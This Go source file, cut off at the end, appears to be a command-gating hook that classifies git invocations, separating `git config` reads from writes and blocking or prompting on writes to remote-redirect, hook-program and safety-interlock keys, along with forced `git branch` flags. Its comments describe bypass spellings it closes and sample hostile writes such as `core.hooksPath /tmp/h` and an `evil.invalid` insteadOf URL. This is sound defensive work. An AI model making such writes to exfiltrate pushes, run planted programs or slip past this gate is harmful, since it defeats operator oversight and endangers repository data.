// configValueShortFlags holds the EXACT short spellings that consume the next
// token. A CLUSTER is deliberately absent: `-zf cfg` does consume `cfg` (git hands
// -f the next argv when the cluster has nothing glued after the letter), but
// `-ft cfg` does NOT (there `t` is -f's glued value), and the two are
// indistinguishable without modelling every letter's arity. Leaving clusters out
// makes them over-count, which is the safe direction — see configValueFlags.
var configValueShortFlags = map[string]bool{"-f": true, "-t": true}

// configElidedValue replaces a separated flag ARGUMENT so the shared operand walk
// skips it. Any token beginning `--` is a flag to cmdparse.Operands, so the
// sentinel is invisible to both the operand count and the key scan.
const configElidedValue = "--elided-flag-value"

// configElideFlagValues returns args with the ARGUMENT of every separated
// value-taking flag replaced by configElidedValue, so that the operand walk sees
// only real operands.
//
// WHY IT IS NEEDED. cmdparse.Operands models no flag arity, so without this
// `git config -f /repo/.git/config --get core.fsmonitor` — a pure READ — presents
// two operands and reads as a write, which would gate it. With the elision it
// presents one and stays approvable.
//
// WHY IT CANNOT OPEN A HOLE. Elision removes only a token that git itself hands to
// a flag, so it reproduces git's own parse rather than second-guessing it — and this
// is what settles the one bypass shape it has to survive. Measured 2026-07-30:
// `git config --comment --get core.hooksPath /tmp/h` DOES perform the write, because
// git's parse-options gives `--comment` the next argv even though that argv looks
// like an option. Eliding `--get` there is therefore the CORRECT reading, and the
// two remaining operands still reach the gate. It also cannot swallow a write's key:
// a valid write names a key AND a value, and for elision to reach the key the flag
// would have to sit directly before it with no argument of its own, which is the
// spelling git rejects.
//
// Scanning STOPS at a `--` end-of-options terminator: after it no token is a flag,
// so none consumes a value.
func configElideFlagValues(args []string) []string {
	out := make([]string, len(args))
	copy(out, args)
	for i := 0; i+1 < len(out); i++ {
		if out[i] == "--" {
			return out // end of options; nothing after it is a flag value
		}
		if configValueShortFlags[out[i]] || configIsValueLongFlag(out[i]) {
			out[i+1] = configElidedValue
			i++ // the elided token cannot itself consume a value
		}
	}
	return out
}

// configIsValueLongFlag reports whether tok is a long spelling of a `git config`
// option that consumes the NEXT token — the full name or an unambiguous prefix down
// to its configValueFlags minimum.
//
// An `=`-glued token (`--type=bool`) is NOT one: its argument is part of the same
// token, so nothing follows to elide. A `--no-<name>` negation is not one either,
// since `no-file` does not prefix-match `file`.
func configIsValueLongFlag(tok string) bool {
	if !strings.HasPrefix(tok, "--") || strings.Contains(tok, "=") {
		return false
	}
	name := tok[2:]
	for full, minLen := range configValueFlags {
		if len(name) >= minLen && len(name) <= len(full) && full[:len(name)] == name {
			return true
		}
	}
	return false
}

// configWriteSubcommands is the git 2.54 SUBCOMMAND form of the same thing. git
// 2.54.0 grew `git config {list|get|set|unset|rename-section|remove-section|edit}`
// beside the legacy positional syntax (both measured working, 2026-07-30), and
// `git config set core.hooksPath /tmp/h` puts the key at the SECOND operand — a
// displacement a rule that only knew the legacy shape would walk straight past.
var configWriteSubcommands = map[string]bool{
	"set": true, "unset": true, "rename-section": true,
	"remove-section": true, "edit": true,
}

// configWriteIndicated reports whether a `git config` invocation is a WRITE on the
// evidence of an explicit option or subcommand alone, independent of how many
// operands it carries. It exists for the spellings configIsRead's operand bound
// cannot see: `--unset <key>` and `--unset-all <key>` name ONE operand, exactly
// like a bare read, and `--edit` names none.
func configWriteIndicated(args []string) bool {
	if sub, _ := cmdparse.FirstOperand(args); configWriteSubcommands[sub] {
		return true
	}
	for name, minLen := range configWriteFlags {
		if _, ok := hasAbbrevLongFlag(args, name, minLen); ok {
			return true
		}
	}
	// `-e` is git's short spelling of --edit. Tested by EXACT token rather than
	// with cmdparse.HasShortFlag because `git config`'s value-taking shorts are
	// `-f` and `-t`, and a glued value (`-fsome.env`) would contribute a stray `e`
	// to a cluster scan.
	return hasFlag(args, "-e")
}

// configIsRead reports whether a `git config` invocation only READS configuration.
// It is the read/write discrimination the gate needs in order to leave
// `git config --get user.email`, `git config --list` and the bare-key form
// `git config core.hooksPath` approvable while gating the writes.
//
// THE TEST IS AN OPERAND BOUND, NOT A FLAG ALLOWLIST, and that is what makes it
// safe. Reading one variable names AT MOST ONE OPERAND — the key — whether it is
// spelled `git config <key>`, `git config --get <key>` or `git config
// --get-regexp <pattern>`; the new-form `git config get <key>` names two, the
// subcommand plus the key. A WRITE always names one more (the value), so:
//
//   - `git config <key> <value>`, `git config --type=bool <key> <value>` and
//     `git config set <key> <value>` all exceed the bound and reach the gate,
//     whatever flags precede them. That is the FLAG-POSITION INDEPENDENCE the bead
//     requires: `--global`, `--local`, `--system` and `--type=bool` are flags, the
//     operand walk skips them, and the count is unchanged.
//   - A SEPARATED flag value (`-f <file>`, `--type bool`, `--comment <msg>`) would
//     otherwise be counted as an operand — cmdparse.Operands documents that it
//     models no arity — and could only push an invocation OUT of the read shape and
//     INTO the gate. So the bound is SOUND without any arity modelling; the
//     measured configElideFlagValues that runs first is a PRECISION layer over it,
//     removing the false prompt on reads such as `git config -f <file> --get
//     <gated-key>`. args reaching this function are already elided.
//
// The bound also closes the one displacement a `FirstOperand == "get"` test would
// have left open: for that token to be a separated flag VALUE rather than the
// new-form subcommand there must be a further operand for the key, and for a write
// a further one for the value, which puts the count past the bound. Measured
// 2026-07-30: git rejects the remaining shapes outright anyway — `git config
// --local get core.hooksPath` answers `error: key does not contain a section: get`,
// because the subcommand form only parses when the subcommand is the FIRST
// argument.
//
// WRITE INDICATORS ARE CHECKED FIRST because two write spellings sit INSIDE the
// bound: `--unset <key>` and `--unset-all <key>` name one operand and `--edit`
// names none. Without configWriteIndicated they would read as reads — and
// `--unset` is a spelling the bead requires be gated.
func configIsRead(args []string) bool {
	if configWriteIndicated(args) {
		return false
	}
	maxOperands := 1
	if sub, _ := cmdparse.FirstOperand(args); sub == "get" || sub == "list" {
		maxOperands = 2 // the git 2.54 subcommand token, plus at most one key
	}
	return len(cmdparse.Operands(args)) <= maxOperands
}

// configKeyID reduces a `git config` key token to the identity gatedConfigKeys is
// keyed on — `<section>.<name>`, LOWERCASED, with any middle subsection DROPPED —
// and reports false for a token that is not key-shaped, which is how a value
// operand is skipped.
//
// LOWERCASING IS GIT'S OWN RULE, not a convenience: git documents section and
// variable names as case-INsensitive (only the subsection is case-sensitive), and
// measured on git 2.54.0, 2026-07-30, `git config CORE.HooksPath /tmp/h` followed
// by `git config --get core.hookspath` printed `/tmp/h`. A case-sensitive table
// would be bypassed by capitalisation.
//
// DROPPING THE MIDDLE is what lets one table entry cover every scope spelling of
// the same variable, which is how git itself treats them: `http.sslVerify` and
// `http.https://host/.sslVerify` (both measured accepted), `diff.<driver>.textconv`,
// `url.<base>.insteadOf`, `credential.<url>.helper`. Only the FIRST and LAST
// segments are read, because the subsection may contain dots and slashes — a
// fixed-part split would fail on `url.https://evil.invalid/.insteadOf`, whose
// subsection alone holds two dots.
func configKeyID(tok string) (section, id string, ok bool) {
	first := strings.IndexByte(tok, '.')
	if first <= 0 {
		return "", "", false // no dot, or an empty section: not a config key
	}
	name := strings.ToLower(tok[strings.LastIndexByte(tok, '.')+1:])
	if name == "" {
		return "", "", false // a trailing dot: no variable name
	}
	section = strings.ToLower(tok[:first])
	return section, section + "." + name, true
}

// gatedConfigKey returns the first operand of a `git config` that names a gated
// key, with the class that decides its verdict.
//
// IT SCANS EVERY OPERAND, WHICH IS THE STRONGER FORM OF THE BEAD'S CONSTRAINT, NOT
// A DEPARTURE FROM IT. The requirement is that the key be located by the operand
// walk rather than at a fixed index, and cmdparse.Operands IS that walk —
// cmdparse.FirstOperand's whole-list form, sharing its one operandIndexes scan. A
// single FirstOperand read is not sufficient here the way it is for `git remote`,
// because `git config` accepts its key at three different operand POSITIONS: first
// in `git config <key> <value>`, second in the git 2.54 `git config set <key>
// <value>`, and second again after a separated `-f <file>` (measured accepted,
// 2026-07-30). Asking "does ANY operand name a gated key" is the only formulation
// none of those walks around. args are already configElideFlagValues'd, so the only
// tokens missing from the scan are ones git ITSELF hands to a flag — never the key
// of a valid write, which always keeps both its key and its value. A regression here
// MUST NOT be fixed by reintroducing an index.
func gatedConfigKey(args []string) (string, configGateClass, bool) {
	for _, op := range cmdparse.Operands(args) {
		section, id, ok := configKeyID(op)
		if !ok {
			continue
		}
		if class, gated := gatedConfigKeys[id]; gated {
			return op, class, true
		}
		if class, gated := gatedConfigSections[section]; gated {
			return op, class, true
		}
	}
	return "", 0, false
}

// configVerdict returns the verdict for a `git config` — rest being the args AFTER
// the `config` subcommand. Like remoteVerdict it always answers, because every
// `git config` is a read, a gated write, or an ordinary write.
//
// THE DEFECT IT CLOSES (pg2-szadj, 2026-07-30). `config` was a plain member of
// modifyingSubcommands, so EVERY key was approved outright with no key inspection
// at any flag position. Measured `allow` on a binary built from main @ 259f3331:
// `git config clean.requireForce false`, `git config --global clean.requireForce
// false`, `git config --type=bool clean.requireForce false` and `git config
// core.hooksPath /tmp/h`. The `-c` injection route for the same sinks was already
// guarded by hasGitConfigInjection; only the PORCELAIN route was open, and the
// `.git`-write guard deliberately exempts git's own arguments ("git is the
// sanctioned porcelain"), so there was no second line of defence.
//
// WHAT MADE IT WORSE THAN A MISSING PROMPT: `git clean` still Asked. The operator
// answering that prompt did so under the belief that git would refuse to delete
// without an explicit force flag — an invariant the config write had already
// removed. The prompt survived; the information behind it did not. See the `clean`
// arm in classify, which now records that invariant, and gatedConfigKeys for the
// per-key survey, the Ask-vs-Reject reasoning, and the invariant each verdict
// rests on.
//
// THE INVARIANTS THE GATED VERDICTS REST ON, so a later reader can check whether
// they are still true:
//
//   - INTERLOCK class — the gated key's git DEFAULT is still the safe value, and no
//     config in scope has changed it. Verify per key with `git config --get <key>`
//     returning nothing (measured: the flag form is a read and stays approvable).
//   - SINK class — the only programs git executes during an ordinary operation are
//     the ones the operator's own configuration names. Verify with `git config
//     --list --show-origin` and read the origins.
//   - REDIRECT class — a remote NAME still resolves to the URL the operator
//     configured. This is the same invariant remoteVerdict protects; `git remote
//     get-url <name>` (approvable) is the check.
//
// READS STAY APPROVE, WITH A CORRECTED REASON. Before this change a read reached
// the modifying arm and was approved as `"modifying git command"` — measured for
// `git config --get user.email`, which modifies nothing. That reason was wrong for
// a read and is now `"read-only git config"`. configIsRead holds the
// discrimination and its bound.
//
// THIS IS THE MODELLING gitdir EXPLICITLY DEFERS HERE. bindingDirection's
// "RESIDUAL ASYMMETRY" note records that a bare `git` cannot be given a read/write
// direction "without modelling every subcommand — the `git` rule's job", citing
// corpus row 237336, which binds `.git/config` and then `git config --unset-all`s
// it. configIsRead is that modelling for `config`, and `--unset-all` is one of the
// write indicators it recognises.
//
// FALSE-POSITIVE COST IS ZERO, measured 2026-07-30 by enumerating every `git
// config` invocation in this repo. The writes are all
// `git-branch-maintenance.protectedBranch` / `.protectedWorktree` (`--local --add`,
// `--unset`, `--unset-all`) and the reads are `pgii-integrate-branch.primaryBranch`
// / `.strategy` and `user.email`. Not one names a gated key, so every in-tree caller
// keeps its Approve.
//
// ONE OTHER VERDICT MOVES, and it is deliberate: a config READ under a redirected
// GIT_DIR/GIT_WORK_TREE. It used to reach the modifying arm and its
// hasRedirectEnvVar Ask; the read short-circuit above now Approves it. That is the
// policy this rule already applies to every other read — `GIT_DIR=/other git log`
// is an Approve (TestGit_GitDirReadOnly_Approve) — so recognising config reads as
// reads makes the two consistent rather than carving an exception. WRITES keep the
// redirect Ask, which is why hasRedirectEnvVar is still consulted below.
//
// ORDINARY WRITES ARE UNTOUCHED, and that is a requirement rather than a
// side effect: `user.email`, `commit.gpgsign` and `branch.<name>.remote` keep
// their Approve with their existing `"modifying git command"` reason, and
// TestGit_Modifying_Approve's `git config x y` row still passes. A blanket
// Ask/Reject on every `git config` write would be the wrong fix — a large
// false-positive surface over routine traffic.
//
// TEXT VS PARSED: every test here reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `git config clean.requireForce false` quoted
// in a commit message or a `bd comment` body is TEXT and never matches. That is the
// pg2-5b901 failure mode; do not reintroduce a strings.Contains over command text.
func (r *Rule) configVerdict(pc cmdparse.ParsedCommand, rest []string) hookio.RuleResult {
	// Elide separated flag ARGUMENTS once, here, so the read/write bound and the key
	// scan agree about what is an operand. Both consumers below take elided args.
	args := configElideFlagValues(rest)
	if configIsRead(args) {
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "read-only git config", Module: r.Name()}
	}
	if key, class, ok := gatedConfigKey(args); ok {
		return r.configGateResult(key, class)
	}
	if hasRedirectEnvVar(pc) {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}
}

// configGateResult turns a gated key and its class into the verdict. The mapping
// lives here rather than in gatedConfigKeys so that every key of one mechanism is
// answered identically — see gatedConfigKeys for why redirect is a Reject while
// sink and interlock are Asks.
//
// The default arm answers ASK, so a class added to configGateClass without a
// verdict of its own fails toward the prompt rather than toward an Approve.
func (r *Rule) configGateResult(key string, class configGateClass) hookio.RuleResult {
	switch class {
	case configRedirect:
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason: "git: writing `" + key + "` is prohibited — it repoints where fetches and pushes go, so a later, " +
				"entirely ordinary `git push origin main` sends repository contents to another host with no `git remote` " +
				"change to show for it (pg2-szadj, 2026-07-30). It is refused rather than prompted because `git remote " +
				"set-url` is already refused for exactly this exfiltration reason, and the config spelling must not be " +
				"the cheaper way around that gate. Every spelling is refused, including --global/--local/--system, " +
				"`git config set`, and --unset. Ask the operator to run it by hand",
			Module: r.Name(),
		}
	case configInterlock:
		return hookio.RuleResult{
			Decision: hookio.Ask,
			Reason: "git: `git config " + key + "` disables a safety interlock — a refusal git makes by DEFAULT, so a " +
				"later command that looks unchanged stops refusing what it used to, and any prompt on that command is " +
				"then answered under a belief that is no longer true (pg2-szadj, 2026-07-30). Every spelling is gated, " +
				"including --global/--local/--system, --type=bool, `git config set` and --unset; reads are not. Confirm " +
				"this is intended, or hand it to the operator",
			Module: r.Name(),
		}
	default: // configSink, and any class added without a verdict of its own
		return hookio.RuleResult{
			Decision: hookio.Ask,
			Reason: "git: `git config " + key + "` points git at a program of the caller's choosing, which git then runs " +
				"during an ordinary git operation — arbitrary code execution with nothing at that later command to show " +
				"for it (pg2-szadj, 2026-07-30). Every spelling is gated, including --global/--local/--system, " +
				"--type=bool, `git config set` and --unset; reads are not. Confirm this is intended, or hand it to the " +
				"operator",
			Module: r.Name(),
		}
	}
}

// chdirSafe reports whether the `-C` target directory is in a zone appropriate
// for the subcommand's access class. Read-only subcommands — and a read-only
// `git remote` — require the directory be READABLE; every other approvable
// subcommand (checkout, rebase, filter-branch, soft reset, and the modifying
// set) writes and requires it be WRITABLE. Returns true (no gate) when no `-C`
// is present or no evaluator is configured, preserving legacy behavior.
//
// `config` is DELIBERATELY not listed beside `remote` even though configVerdict
// now answers Approve for a read: this function sees only the subcommand, not the
// verdict, so listing it would drop the write-access requirement from every `git
// config -C <dir> <key> <value>` too. Leaving it in the writable class keeps a
// read-only `git config -C <dir> --get <key>` at exactly the demotion it had
// before this bead — an over-restriction on the safe side, unchanged by pg2-szadj.
func (r *Rule) chdirSafe(cwd string, chdirs []string, subcmd string) bool {
	if r.eval == nil || len(chdirs) == 0 {
		return true
	}
	access := r.eval.Evaluate(effectiveDir(cwd, chdirs))
	if readOnlySubcommands[subcmd] || subcmd == "remote" {
		return access.CanRead()
	}
	return access.CanWrite()
}

// effectiveDir folds git's `-C` chdir values onto cwd the way git does: an
// absolute chdir resets the running directory, a relative one is joined onto
// it. A leading `~` is expanded to the user's home so an unexpanded tilde
// cannot be mistaken for an in-project directory (a shell would expand it
// before git runs). Mirrors primarycommit.effectiveDir (unexported there); any
// env var in the folded path is expanded by patheval.PathEvaluator.Evaluate.
func effectiveDir(cwd string, chdirs []string) string {
	dir := cwd
	for _, c := range chdirs {
		c = expandTilde(c)
		if filepath.IsAbs(c) {
			dir = c
		} else {
			dir = filepath.Join(dir, c)
		}
	}
	return dir
}

// expandTilde expands a leading `~` or `~/` to the user's home directory,
// mirroring patheval's cleanPath so a `-C ~/...` value is resolved to an
// absolute path before zone classification. Non-tilde paths are returned as-is.
func expandTilde(p string) string {
	if p == "~" || strings.HasPrefix(p, "~/") {
		if home, err := os.UserHomeDir(); err == nil && home != "" {
			return filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	return p
}

func isGitExecutable(exec string) bool {
	return exec == "git" || filepath.Base(exec) == "git"
}

// hasGitConfigInjection reports whether a pre-subcommand -c or --config-env
// flag is present. It scans only the option span before the git subcommand
// (mirroring cmdparse.GitInvocation's flag-consuming walk) so that a -c appearing
// AFTER the subcommand (e.g. `git commit -c <commit>`) is not matched.
func hasGitConfigInjection(args []string) bool {
	i := 0
	for i < len(args) {
		a := args[i]
		if a == "-c" {
			return true
		}
		if a == "--config-env" || strings.HasPrefix(a, "--config-env=") {
			return true
		}
		switch a {
		case "-C", "--git-dir", "--work-tree", "--namespace":
			i += 2
			continue
		default:
			if strings.HasPrefix(a, "-") {
				i++
				continue
			}
			return false // first non-flag token is the subcommand
		}
	}
	return false
}

func hasFlag(args []string, flag string) bool {
	for _, a := range args {
		if a == flag {
			return true
		}
	}
	return false
}

func hasRedirectEnvVar(pc cmdparse.ParsedCommand) bool {
	for _, ev := range pc.EnvVars {
		if ev.Name == "GIT_DIR" || ev.Name == "GIT_WORK_TREE" {
			return true
		}
	}
	return false
}

func hasSequenceEditorEnvVar(pc cmdparse.ParsedCommand) bool {
	for _, ev := range pc.EnvVars {
		if ev.Name == "GIT_SEQUENCE_EDITOR" {
			return true
		}
	}
	return false
}

// isBranchUnsafe reports whether a `git branch` invocation is one from which GIT'S
// OWN GUARD has been removed. It holds the WHOLE `git branch` policy; the branch arm
// in classify is only the verdict it feeds.
//
// THE VERDICT IS BY SAFETY, NOT BY FLAG — operator ruling of 2026-07-31, recorded as
// pg2-4yy4r item 5 and implemented by pg2-fkmg4: "abstain for any spelling which is
// unsafe, approve any which is safe". That SUPERSEDES the narrower "`git branch -D` →
// Ask" ruling and, with it, the force-DELETE conjunction pg2-os1kq's widening put
// here (isBranchForceDelete, folded into this predicate and deleted).
//
// THE BOUNDARY IS GIT'S, NOT OURS, which is what makes this predicate short. `git
// branch -h` states it outright:
//
//	-d, --[no-]delete   delete fully merged branch           GUARDED
//	-D                  delete branch (even if not merged)   = -d FUSED with --force
//	-m, --[no-]move     move/rename a branch and its reflog  GUARDED
//	-M                  move/rename, even if target exists   = -m FUSED with --force
//	-c, --[no-]copy     copy a branch and its reflog         GUARDED
//	-C                  copy, even if target exists          = -c FUSED with --force
//	-f, --[no-]force    force creation, move/rename, deletion
//
// The LOWERCASE forms are GUARDED: git itself refuses the destructive case, so they
// are not this rule's business and keep their Approve. The UPPERCASE forms ARE the
// guarded form fused with --force, and an explicit -f/--force removes the guard from
// any of them. So "is it unsafe" is exactly "is the guard gone" — three fused letters,
// plus force in any spelling.
//
// `-D` WAS NEVER THE REAL SURFACE, which is the finding that motivated the ruling.
// Measured 2026-07-31 in throwaway repos: `git branch -M old keepme` CLOBBERED the
// existing target, `keepme` going bdfdb1f -> bad17ef, and `git branch -C a keepme`
// overwrote an existing branch — both `allow` before this change. Their guarded twins
// held: `-m old keepme` answered "fatal: a branch named 'keepme' already exists" and
// `-d unmerged` answered "error: the branch 'unmerged' is not fully merged".
//
// `-f` ALONE IS NOW GATED, REVERSING WHAT THIS FILE USED TO SAY, and this is the one
// verdict that moves from Approve for a spelling no earlier bead thought destructive.
// isBranchForceDelete's doc recorded `git branch -f <name> <start>` as "a force-MOVE/
// create, no delete at all … Gating `-f` alone would gate that, so it is deliberately
// not gated". Force CREATION silently MOVES an EXISTING branch ref, which is the same
// lost tip under another name, and the tokens alone cannot say whether <name> already
// exists — so the guard-removed reading is the only one available from the command
// line, and the ruling gates it.
//
// MEASURED, git 2.54.0, throwaway repo, 2026-08-12, with `keepme` at 82cd0ea and
// `probe` at 6eeb755:
//
//	git branch keepme probe      -> "fatal: a branch named 'keepme' already exists"
//	                                (the guard; keepme untouched)
//	git branch -f keepme probe   -> accepted, and keepme MOVED 82cd0ea -> 6eeb755
//
// One flag, and the same command goes from a refusal to a silent ref rewrite. Nothing
// in the argv distinguishes the two, which is the whole reason `-f` cannot be read as
// "just a creation".
//
// WHY ABSTAIN AND NOT ASK, AND THE CONSEQUENCE THE OPERATOR ACCEPTED. Abstain emits
// `{}` (hookio.FormatOutput), so an unsafe `git branch` PROMPTS in `default` mode and
// is AUTO-APPROVED in an auto-approving mode. The operator accepted that explicitly,
// consistent with the same ruling for `git clean` (pg2-u0e0c) and `git reset --hard`
// (pg2-ur9zc), on the mitigation that a deleted or clobbered branch TIP stays
// reachable through the reflog for gc.reflogExpire (90 days by default) — materially
// less final than `git clean -fdx`. Raising this to Ask or Reject would contradict
// that ruling and needs a new one.
//
// THE `--no-` TRAP, AND WHY IT NEEDED NO NEW HELPER. `git branch -h` spells the long
// forms `--[no-]force` / `--[no-]delete` / `--[no-]move` / `--[no-]copy`, so
// `--no-force` is a REAL spelling and MUST NOT read as force. cmdparse.HasLongFlag
// documents that it covers no negation, and a hand-rolled `strings.HasPrefix(tok,
// "--f")` predicate would have had to exclude them by hand — which is the trap. The
// matcher used here does not: cmdparse.HasLongFlagPrefix never matches a token LONGER
// than its canonical, and "no-force" is longer than "force", so every negation is
// excluded BY CONSTRUCTION. That is why no sibling of HasLongFlag was added.
//
// AND THE NEGATION REALLY IS THE OPPOSITE, measured on git 2.54.0, 2026-08-12 in the
// same repo as above: `git branch --no-force newname probe` was accepted (so it IS a
// spelling git parses), while `git branch --no-force keepme <other>` answered "fatal: a
// branch named 'keepme' already exists" — the guard git had just skipped for `-f` was
// back. Reading `--no-force` as force would gate the STRICTER of the two commands.
//
// CASE IS SIGNIFICANT, an explicit acceptance criterion: `-d`/`-D`, `-m`/`-M` and
// `-c`/`-C` differ in meaning, and cmdparse.HasShortFlag compares BYTES, so no folding
// can happen. `-F` is not a `git branch` option at all and is not `--force`.
//
// POSITION DOES NOT MATTER — every token is scanned, so a flag written AFTER the
// operand (`git branch foo -D`) is still seen — and the `--` END-OF-OPTIONS TERMINATOR
// IS RESPECTED, because both cmdparse matchers stop there: `git branch -- -D` is a
// branch NAMED `-D` and stays approvable.
//
// THE LONG HALF USES cmdparse.HasLongFlagPrefix rather than a measured minimum, per
// the rule recorded on hasAbbrevLongFlag: this is a BOOLEAN dangerous-flag test, so
// over-matching only moves the verdict toward Abstain. It does over-match — real git
// answers `error: ambiguous option: f (could be --force or --format)` for
// `git branch --d --f <b>` (measured 2026-07-30, recorded by pg2-os1kq), which this
// gates anyway — and that is the fail-safe direction. `--format=…` cannot be mistaken
// for `--force`: "format" is longer than "force", and HasLongFlagPrefix never matches a
// longer token against a shorter canonical, which is also what keeps the `--no-`
// negations out.
//
// SCOPE IS `git branch` ONLY. The operator stated the principle generally, but ruled
// it only here. Several other git subcommands still get ONE blanket verdict regardless
// of flags (`git clean` is the documented example), and widening the principle to them
// is its own bead and its own ruling — pg2-fkmg4 says so in terms. Do not generalise
// this predicate.
func isBranchUnsafe(args []string) bool {
	shorts := branchShortFlagTokens(args)
	// The FUSED forms: a guarded operation with --force baked into the one letter, in
	// any cluster position (`-D`, `-Dv`, `-vM`, `-rC`).
	if cmdparse.HasShortFlag(shorts, 'D') || cmdparse.HasShortFlag(shorts, 'M') || cmdparse.HasShortFlag(shorts, 'C') {
		return true
	}
	// An EXPLICIT force removes the guard from delete, move, copy AND creation, so it
	// is unsafe ON ITS OWN. NO CONJUNCTION with a delete/move/copy half is required,
	// and requiring one is precisely what let `-M`, `-C`, `-f`, `-m -f` and `-c -f`
	// through before pg2-fkmg4 — a conjunction can only ever gate the pairs someone
	// remembered to enumerate.
	return cmdparse.HasShortFlag(shorts, 'f') || cmdparse.HasLongFlagPrefix(args, "force")
}

// branchShortFlagTokens returns args with every short-flag cluster truncated at its
// first VALUE-TAKING letter — `git branch`'s `-u <upstream>` and `-t[=<mode>]`, the
// only two shorts of that subcommand which accept a GLUED value. Measured on git
// 2.54.0, 2026-07-30: `git branch -uorigin/main` answered "the requested upstream
// branch 'origin/main' does not exist" and `-tdirect` was accepted, while `-mzz` and
// `-czz` both answered "unknown switch `z'" — so `-m` and `-c` need no truncation.
//
// WITHOUT THIS, AN UPSTREAM OR BRANCH NAME MANUFACTURES A VERDICT. Everything after
// the value-taking letter is the option's VALUE, not more flag letters, yet a cluster
// scan reads it as letters. The false-positive surface GREW when pg2-fkmg4 widened the
// predicate from force-delete to every unguarded spelling, because it now asks about
// four letters instead of two: `-uorigin/DEV` carries a `D`, `-uorigin/MAIN` an `M`,
// `-uorigin/CI` a `C`, and `-uorigin/feature-docs` an `f` — each a false verdict on its
// own, with no second half needed. This is the same false-positive class pg2-5b901
// records, arrived at through flag arity instead of command text, and the same reason
// pushShortFlagTokens exists for `git push -o <opt>`. cmdparse.HasShortFlag documents
// that it models no arity and pushes exactly this question to its caller.
//
// TRUNCATION IS LOSSLESS, measured the same day: `-tD` answers "option `--track'
// expects \"direct\" or \"inherit\"" and `-uD` answers "the requested upstream branch
// 'D' does not exist" — neither deletes anything, because there the `D` IS the
// option's value — while `-Dt` and `-Dft` DO delete and carry their `D` BEFORE the
// truncation point, so both survive. The same reading covers the letters pg2-fkmg4
// added: after `-t` or `-u` an `M`, `C` or `f` is that option's VALUE (a track mode git
// refuses, or an upstream branch name), so nothing that really moves, copies or forces
// is lost, while `-Mt`, `-Cf` and `-fu` carry their letter before the truncation point.
//
// `--`, long flags and a lone `-` are returned untouched so HasShortFlag's own
// end-of-options and operand handling still applies.
func branchShortFlagTokens(args []string) []string {
	out := make([]string, len(args))
	for i, a := range args {
		if len(a) > 1 && a[0] == '-' && a[1] != '-' {
			if v := strings.IndexAny(a, "ut"); v > 0 {
				a = a[:v] // drop the value-taking letter and everything after it
			}
		}
		out[i] = a
	}
	return out
}

// Long-flag ABBREVIATION MINIMUM for the ONE `git push` option pushVerdict reads a
// VALUE from. git's parse-options accepts any UNAMBIGUOUS PREFIX of a long option,
// so `--rep=<url>` is a real spelling of `--repo=<url>`.
//
// The value is the SHORTEST prefix real git accepted, MEASURED with `git push
// <spelling> origin main` against git 2.54.0 on 2026-07-30; one character shorter,
// git answered `error: ambiguous option`. Re-measure before changing it.
//
// ONLY `--repo` IS LEFT HERE (pg2-os1kq). `--force`, `--force-with-lease`,
// `--mirror` and `--delete` had measured minimums too — `len("force")`,
// `len("force-w")`, `len("m")` and `len("de")`, each re-confirmed on git 2.54.0,
// 2026-07-30 — and every one of them has moved to cmdparse.HasLongFlagPrefix. Those
// four are BOOLEAN dangerous-flag tests whose only effect is to make the verdict
// more restrictive, so a measured bound buys nothing and COSTS the thing this bead
// is about: a minimum is a property of git's option table AT MEASUREMENT TIME, not
// of this code, so `--forc` is safe today only because it is ambiguous with
// --force-if-includes, and the day git retires that option `--forc` becomes a live
// force-push this rule would approve. `--repo` keeps its minimum because its
// `=`-glued VALUE is read and used as the push destination; see hasAbbrevLongFlag
// for the rule that decides between the two matchers.
const minAbbrevRepo = len("rep") // `--re` is ambiguous: --recurse-submodules / --receive-pack

// hasAbbrevLongFlag reports whether args carries long flag name in any spelling
// git would accept — the full name, or an unambiguous prefix down to minLen
// characters — and returns the value of the `=`-glued form (see
// cmdparse.HasLongFlag for what an empty value means). It asks
// cmdparse.HasLongFlag once per candidate spelling, LONGEST FIRST, so the glued
// value is read from the longest spelling actually present.
//
// A `--no-<name>` token does not match, which is correct: `--no-force` turns
// force off.
//
// minLen is per SUBCOMMAND, not per flag name: what a prefix is ambiguous with
// depends on which option table git parsed the command against. The measured
// minimums live beside the subcommand that needs them — see minAbbrevRepo for
// `git push` and the `git config` block (minAbbrevUnset and its neighbours) — and
// this helper holds none of its own.
//
// # WHICH MATCHER TO USE (pg2-os1kq) — the rule, so the next author does not guess
//
// Two abbreviation matchers now exist and they are NOT interchangeable. Both are
// prefix-aware; they differ in whether the prefix is BOUNDED by a measured
// minimum. The test is what a MATCH is used for, not which flag it is:
//
//   - cmdparse.HasLongFlagPrefix — an OPEN prefix, no minimum — is the DEFAULT, and
//     MUST be used for a BOOLEAN DANGEROUS-FLAG TEST: one whose only effect is to
//     move the verdict toward Ask or Reject. Over-matching is then fail-safe by
//     construction (a spelling git would refuse as ambiguous is refused here
//     instead), and the caller stops depending on git's current option table. Every
//     `git push` force / --mirror / --delete / --force-with-lease gate, the `reset`
//     `--hard` gate and the `rebase` `--interactive` gate are this shape.
//   - hasAbbrevLongFlag — a MEASURED minimum — MUST be used where the match's
//     LENGTH or the flag's VALUE is load-bearing, because over-matching there has no
//     safe direction. Two call sites qualify and they are the only ones:
//     pushNetworkDestination's `--repo`, whose `=`-glued VALUE becomes the
//     destination the gate rules on; and every `git config` option
//     (configWriteFlags, and configIsValueLongFlag's own bounded loop over
//     configValueFlags), where a match ELIDES a token and so shifts the operand
//     count configIsRead's read/write bound and gatedConfigKey's key scan both
//     depend on. A blanket switch to the open matcher there could mis-elide and
//     silently change a `git config` verdict.
//
// A NEW long-flag test MUST pick by that rule and is checked mechanically:
// TestGit_LongFlagTests_AreAbbreviationAware in flagmatch_test.go walks this file's
// AST and fails any exact-token long-flag test outside its named exemptions, and
// pins each gated flag to the matcher chosen above.
func hasAbbrevLongFlag(args []string, name string, minLen int) (string, bool) {
	for n := len(name); n >= minLen; n-- {
		if v, ok := cmdparse.HasLongFlag(args, name[:n]); ok {
			return v, true
		}
	}
	return "", false
}

// pushShortFlagTokens returns args with every short-flag cluster truncated at
// its first `o` — `git push`'s ONLY short option that takes a value (`-o <opt>`,
// and glued as `-oci.skip`, measured accepted on git 2.54.0). Everything after
